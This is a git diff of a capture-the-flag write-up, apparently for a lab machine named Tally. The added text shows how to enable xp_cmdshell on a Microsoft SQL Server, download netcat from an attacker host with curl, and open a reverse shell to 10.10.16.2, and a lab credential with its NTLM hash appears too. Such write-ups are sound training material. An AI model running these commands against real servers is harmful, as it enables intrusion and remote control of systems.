@@ -581,9 +581,39 @@ Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 [!] Press help for extra shell commands
 SQL>
 ```
+Once inside the MSSQL we can try to execute the following commands to get RCE:
 
+```bash
+SQL> xp_cmdshell "whoami"
+[-] ERR0R(TALLY): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component ,xp_cmdshell’ because this component is turned off as part of the security figuration for this server. A system administrator can enable the use of ,xp_cmdshell' by using sp_configure. For more information about enabling 'xp.cmdshell', search for p_cmdshell' in SQL Server Books Online.
+SQL> sp_configure "xp_cmdshell", 1
+[-] ERR0R(TALLY): Line 62: The configuration option 'xp_cmdshell' does not exist, or it may be an advanced option.
+SQL> sp_configure "show advanced options", 1
+[*] INF0(TALLY): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
+SQL> reconfigure
+SQL> sp_configure "xp_cmdshell", 1
+[*] INF0(TALLY): Line 185: Configuration option 'xp.cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
+SQL> reconfigure
+SQL> xp_cmdshell "whoami"
+```
+Finally, we can get a reverse shell by executing the following commands:
+```bash
+# Upload the netcat windows binary:
+SQL> xp_cmdshell "mkdir C:\Windows\Temp\shuciran"
+SQL> xp_cmdshell "curl http://10.10.16.2/nc.exe -o C:\Windows\Temp\shuciran\nc.exe"
+output                                                                             
+
+# Verify that is correctly uploaded
+SQL> xp_cmdshell "dir C:\Windows\Temp\shuciran\nc.exe"
+# Execute the reverse shell
+SQL> xp_cmdshell "C:\Windows\Temp\shuciran\nc.exe -e cmd.exe 10.10.16.2 443"
+```
+AND WE ARE INSIDE!!!
 
 ### Root privesc
+
+
+
 
 ### Post Exploitation
 
@@ -594,9 +624,9 @@ sqlsvc:Pegasus60 NTLM -> B999A16500B87D17EC7F2E2A68778F05
 
 ### Notes
 
--   Chisel have different configurations, this time we use a Forward SOCKS Proxy, which is a bind shell, that is not neccessarily the easiest way to forward the remote port, but is a new way to consider in case that a reverse shell is not possible.
--   Always look for exploits, analyze them and check if something can be useful to exploit the machine.
--   Chisel has some
+- Chisel have different configurations, this time we use a Forward SOCKS Proxy, which is a bind shell, that is not neccessarily the easiest way to forward the remote port, but is a new way to consider in case that a reverse shell is not possible.
+- Always look for exploits, analyze them and check if something can be useful to exploit the machine.
+- Chisel has some
 
 ### Resources:
 
